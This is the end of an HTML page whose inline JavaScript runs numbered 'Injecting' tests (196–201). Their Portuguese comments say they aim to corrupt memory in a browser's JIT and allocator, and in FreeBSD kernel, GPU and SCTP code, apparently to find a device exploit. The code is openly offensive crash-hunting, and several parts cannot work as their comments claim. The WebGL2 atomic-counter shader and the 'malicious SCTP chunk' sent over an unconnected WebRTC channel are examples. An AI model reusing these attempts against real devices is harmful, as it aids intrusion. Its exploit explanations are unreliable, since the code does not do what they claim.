        // nunca sai da função e o aloca na Stack. Forçamos uma saída (OSR Exit)
        // onde o objeto é "materializado" no Heap com offsets errados.
        function runTest196() {
            log("196. Injecting: JIT Materialization OOB...");
            
            const arr = new Array(100);
            arr.fill(1.1);

            function opt(b) {
                // Objeto virtual (candidato a Stack Allocation)
                let o = {a: 1, b: 2, c: 3};
                // Acesso condicional que pode forçar materialização
                if (b) {
                    // Se o JIT calcular mal o offset de recuperação, 'o.a' lê lixo
                    return o.a + arr[0];
                }
                return 0;
            }

            // Treina o JIT para pensar que 'b' é sempre falso (No Escape)
            for(let i=0; i<100000; i++) opt(false);

            try {
                // Força o caminho "b=true" (OSR Exit)
                let val = opt(true);
                log("JIT Exit Triggered. Result: " + val);
            } catch(e) { log("Safe Bailout: " + e); }
        }

        // 197. bmalloc Large/Small Confusion
        // Baseado em: "FATAL: attampting to allocate small object using large allocation".
        // O bmalloc trata alocações pequenas e grandes de forma diferente.
        // Tentamos criar um objeto que está no limite (Boundary) entre as categorias.
        function runTest197() {
            log("197. Injecting: bmalloc Size Class Confusion...");
            
            let allocations = [];
            // Tamanhos de fronteira comuns no bmalloc (Page Size, etc)
            const sizes = [1024, 2048, 4096, 8192, 16384];
            
            try {
                for(let s of sizes) {
                    // Aloca no limite - 8 bytes (header) e no limite + 8 bytes
                    allocations.push(new ArrayBuffer(s - 8));
                    allocations.push(new ArrayBuffer(s + 8));
                }
                
                // Força fragmentação agressiva
                allocations = allocations.filter((_, i) => i % 2 === 0);
                
                // Tenta alocar TypedArrays sobre os buracos
                let confuse = new Float64Array(2048);
                confuse.fill(1.1);
                
                log("Allocator stress boundaries tested.");
            } catch(e) { log("Alloc Error: " + e); }
        }

        // 198. Proxy Revoke Scope Confusion
        // Tenta usar um Proxy revogado dentro de um contexto que assume o objeto vivo.
        // Foca na interação entre Proxies revogáveis e o coletor de lixo.
        function runTest198() {
            log("198. Injecting: Proxy Scope Confusion...");
            
            let {proxy, revoke} = Proxy.revocable({}, {});
            let weak = new WeakRef(proxy);
            
            // Registra no FinalizationRegistry para detectar GC
            const reg = new FinalizationRegistry(() => log("Proxy collected"));
            reg.register(proxy, "token");
            
            try {
                // Revoga imediatamente
                revoke();
                // Tenta acesso ilegal em loop apertado para confundir o JIT
                // O JIT pode tentar "inlinar" o acesso antes de checar a revogação
                for(let i=0; i<1000; i++) {
                    let x = proxy.a; 
                }
            } catch(e) { 
                // Esperado, mas estamos procurando o crash do engine, não o catch
            }
            log("Revoked access attempts complete.");
        }

        // ==========================================
        //        KERNEL VECTORS (199-201)
        // ==========================================

        // 199. MADV_FREE Page Fault Race (FreeBSD VM)
        // Baseado em: "vm.budgets". O FreeBSD tem uma otimização "MADV_FREE" que marca
        // páginas como "libertáveis" mas não as limpa imediatamente.
        // Tentamos escrever numa página marcada para libertação em uma thread, enquanto o kernel a reclama.
        function runTest199() {
            log("199. Injecting: MADV_FREE Page Race...");
            
            // Worker que aloca e transfere memória rapidamente (simula madvise/free behavior)
            const blob = new Blob([`
                onmessage = e => {
                    let ab = e.data;
                    // Escreve dados (Dirty page)
                    let view = new Int32Array(ab);
                    view[0] = 0x1337;
                    // Envia de volta (Transfer detacha, Kernel marca páginas)
                    postMessage(ab, [ab]);
                }
            `], {type: 'text/javascript'});
            
            const w = new Worker(URL.createObjectURL(blob));
            
            let i = setInterval(() => {
                let ab = new ArrayBuffer(1024 * 64); // 64KB Page
                w.postMessage(ab, [ab]);
            }, 1); // Alta frequência
            
            w.onmessage = e => {
                // Recebe de volta. Tenta ler imediatamente.
                // Se o Kernel reclamou a página física no meio do transfer, lemos zeros ou panic.
                let view = new Int32Array(e.data);
                if(view[0] !== 0x1337) log("Memory corruption detected!");
            };
            
            setTimeout(() => { clearInterval(i); w.terminate(); log("VM Race finished."); }, 3000);
        }

        // 200. GPU Atomic Counter Overflow
        // Baseado em: GnmDriver logs.
        // Usa WebGL2 Atomic Counters para escrever num buffer.
        // Se incrementarmos o contador para além do tamanho do buffer ligado, a GPU escreve em memória alheia.
        function runTest200() {
            log("200. Injecting: GPU Atomic Overflow...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("WebGL2 required.");
            
            // Buffer de Contador Atómico (Pequeno: 4 bytes)
            const buffer = gl.createBuffer();
            gl.bindBuffer(gl.ATOMIC_COUNTER_BUFFER, buffer);
            gl.bufferData(gl.ATOMIC_COUNTER_BUFFER, 4, gl.DYNAMIC_DRAW);
            gl.bindBufferBase(gl.ATOMIC_COUNTER_BUFFER, 0, buffer);
            
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            // Shader que incrementa massivamente o contador
            const src = `#version 300 es
            precision highp float;
            layout(binding = 0, offset = 0) uniform atomic_uint ac;
            out vec4 color;
            void main() {
                // Loop de incremento agressivo
                for(int i=0; i<10000; i++) {
                    atomicCounterIncrement(ac); 
                }
                color = vec4(1.0);
            }`;
            
            gl.shaderSource(fs, src);
            gl.compileShader(fs);
            
            // Setup pipeline dummy para rodar o fragment shader
            const p = gl.createProgram();
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
            
            // Draw call (1000 pixels * 10000 incs = 10 Milhões de escritas em 4 bytes)
            gl.drawArrays(gl.POINTS, 0, 1000);
            
            log("Atomic Overflow shader dispatched.");
        }

        // 201. SCTP Chunk Heap Corruption (Network Stack)
        // Baseado em: "mbuf" errors.
        // Envia dados binários formatados como chunks SCTP maliciosos via WebRTC.
        // Tenta explorar o parser de pacotes do kernel (FreeBSD SCTP stack).
        function runTest201() {
            log("201. Injecting: SCTP Heap Corruption...");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("sctp_fuzz", {
                ordered: false, 
                maxRetransmits: 0,
                protocol: "sctp" // Hint
            });
            
            // Constrói um payload que parece um chunk SCTP válido mas com tamanho mentiroso
            // Type(1) Flags(1) Length(2) -> Tenta overflow no Length
            const maliciousChunk = new Uint8Array(2000);
            maliciousChunk.fill(0x41);
            // Simula cabeçalho corrompido no payload (se o kernel inspecionar o conteúdo)
            maliciousChunk[0] = 0xFF; 
            
            pc.createOffer().then(o => pc.setLocalDescription(o));
            
            let i = setInterval(() => {
                try {
                    // Envia em rajada
                    for(let k=0; k<10; k++) dc.send(maliciousChunk);
                } catch(e) {}
            }, 10);
            
            setTimeout(() => { clearInterval(i); pc.close(); log("SCTP packet storm ended."); }, 2000);
        }



    </script>
</body>
</html>
